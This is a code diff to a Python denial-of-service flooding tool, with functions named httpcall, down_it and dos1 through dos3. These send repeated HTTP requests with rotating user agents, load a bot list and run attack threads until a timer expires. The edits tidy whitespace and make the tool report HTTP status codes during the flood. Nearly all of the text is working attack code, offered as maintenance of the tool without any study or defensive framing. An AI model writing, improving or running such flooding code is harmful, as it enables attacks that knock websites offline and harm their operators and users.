@@ -49,7 +49,7 @@ def infoTool():
     spinner.succeed("Author  : %s." % __author__)
     spinner.succeed("Version : %s."%__version__)
     spinner.succeed("Status  : %s." % __status__)
-    
+
     spinner.stop()
 
 os.system("clear")
@@ -89,7 +89,7 @@ end_time = time.time() + attack_time
 
 def user_agent():
     global uagent
-    
+
     with open('user_agent.txt', 'r') as ua:
         uagent = [line.strip() for line in ua.readlines()]
     return uagent
@@ -100,26 +100,26 @@ def my_bots():
         bots = [line.strip() for line in b.readlines()]
     return bots
 
-        
+
 def httpcall(url):
     global successHttp
     successHttp = 0
     try:
         while time.time() < end_time:
             successHttp += 1
-            
+
             req = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': random.choice(uagent)}))
-            print(f"\033[94m[ OK ] {L}HTTPCALL !\033[0m")
-            
+            print(f"\033[94m[ {req.getcode()} ] {L}HTTPCALL !\033[0m")
+
             time.sleep(.0)
-    except:
-        print(f'\033[94m[ ERROR ] {L}Error Httpcall !')
+    except urllib.error.HTTPError as e:
+        print(f'\033[94m[ {e.code} ] {L}Error Httpcall !')
         time.sleep(.0)
     else:
         print(f'{B}[ % ] {L}HTTP Sent : {B}{successHttp}.')   
 
 # -- Down It -- #
-	
+
 def down_it(item):
     global sent
     try:
@@ -141,7 +141,7 @@ def down_it(item):
         print("\033[91mno connection! server maybe down\033[0m")
         print(f"\033[91mSocket error: {e}\033[0m")
         time.sleep(.1)
-    
+
     print(f"{F}[ ! ]{L} The attack is complete.")
     print(f"{B}[ % ] {L}Request Sent : {B}{sent}.")
     sys.exit(1)
@@ -152,7 +152,7 @@ uagent = user_agent()
 def dos1():
     while time.time() < end_time:
         down_it(None)
-   
+
     sys.exit(1)
 
 
@@ -189,10 +189,8 @@ def dos3():
 
 # -------------------------
 
-	
+
 # Run the functions in separate threads for concurrency
 
 threading.Thread(target=dos1).start()
 threading.Thread(target=dos2).start()
-
-
